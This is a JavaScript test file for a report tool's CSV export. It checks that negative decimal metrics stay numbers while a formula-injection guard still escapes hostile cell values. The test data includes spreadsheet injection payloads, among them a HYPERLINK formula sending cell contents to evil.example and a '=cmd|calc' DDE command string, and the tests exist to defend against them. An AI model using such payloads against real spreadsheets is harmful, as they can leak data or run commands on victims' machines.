import test from 'node:test';
import assert from 'node:assert/strict';
import {exportCsv} from '../dist/src/report-table.js';
import {csvDecimalField, csvField} from '../dist/src/csv-safety.js';
import {row} from './helpers/report-packets.mjs';
import {reportEngine} from './helpers/report-engine.mjs';

// F-L9-04: the exact metrics of a v4 report are decimal strings, and the CSV guard (SEC-04) gave every string a leading
// apostrophe when it starts with a minus. A negative metric became text. The guard stays for every name and for any
// metric cell that is not a plain decimal.
const hostile = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
/** The cells of the CSV text as arrays of strings, each cell unquoted. */
const parse = csv =>
  csv
    .replace(/^﻿/, '')
    .split('\r\n')
    .map(line => (line.match(/"(?:[^"]|"")*"/g) ?? []).map(cell => cell.slice(1, -1).replaceAll('""', '"')));
const custom_metrics = [{id: 'margin', label: 'Margin', format: 'decimal', formula: 'clicks-spend'}];

for (const levels of [['campaign'], ['campaign', 'ad']])
  test(`a negative custom metric is a number in the CSV and a hostile name beside it is guarded (${levels.join(' + ')})`, async t => {
    const e = reportEngine(t, {
      rowsFor: level =>
        level === 'ad'
          ? [row('ad', '=cmd|calc', {spend: '5', clicks: '2'}, {entity_name: '-20% sale'})]
          : [
              row('campaign', 'c1', {spend: '5', clicks: '2'}, {campaign_name: hostile}),
              row('campaign', 'c2', {spend: '5', clicks: '2'}, {campaign_name: '-5'}),
            ],
    });
    const {stored} = await e.go(levels, {metrics: ['spend', 'clicks'], custom_metrics});
    assert.equal(stored.state, 'complete', JSON.stringify(stored.sources?.map(s => s.error ?? null)));
    const [header, ...body] = parse(exportCsv(stored)),
      column = name => header.indexOf(name),
      campaign = body.find(cells => cells[column('Campaign ID')] === 'c1');
    assert.equal(campaign[column('margin')], '-3', 'the negative metric stays a plain number');
    assert.equal(campaign[column('spend')], '5');
    assert.equal(campaign[column('Campaign')], "'" + hostile, 'the hostile name is still shown as literal text');
    const numeric = body.find(cells => cells[column('Campaign ID')] === 'c2');
    assert.equal(numeric[column('Campaign')], "'-5", 'a name that looks like a negative number is still a name');
    if (levels.includes('ad')) {
      const ad = body.find(cells => cells[column('Entity level')] === 'ad');
      assert.equal(ad[column('margin')], '-3');
      assert.equal(ad[column('Entity ID')], "'=cmd|calc");
      assert.equal(ad[column('Entity')], "'-20% sale");
    }
  });

test('only a plain decimal skips the guard: any other text in a metric column is guarded as before', () => {
  assert.equal(csvDecimalField('-3'), '"-3"');
  assert.equal(csvDecimalField('0.125'), '"0.125"');
  assert.equal(csvDecimalField('-0.000000001'), '"-0.000000001"');
  assert.equal(csvDecimalField('=1+1'), `"'=1+1"`);
  assert.equal(csvDecimalField('-3 +cmd'), `"'-3 +cmd"`);
  assert.equal(csvDecimalField('-3\n=1'), `"'-3\n=1"`);
  assert.equal(csvDecimalField('1e3'), `"1e3"`, 'not a plain decimal, but nothing a spreadsheet runs');
  assert.equal(csvDecimalField(null), '""');
  assert.equal(csvField('-3'), `"'-3"`, 'a text cell outside the metric columns keeps the guard');
});
